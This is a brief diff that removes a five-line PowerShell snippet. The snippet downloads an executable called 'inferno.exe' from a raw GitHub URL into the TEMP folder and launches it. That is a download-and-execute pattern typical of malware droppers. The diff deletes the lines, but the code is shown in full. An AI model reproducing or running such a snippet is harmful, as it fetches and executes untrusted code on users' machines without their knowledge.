@@ -1,5 +1,0 @@
-$url = "https://raw.githubusercontent.com/thegolf/tttttt/main/inferno.exe"
-$path = "$env:TEMP\program.exe"
-
-Invoke-WebRequest $url -OutFile $path
-Start-Process $path
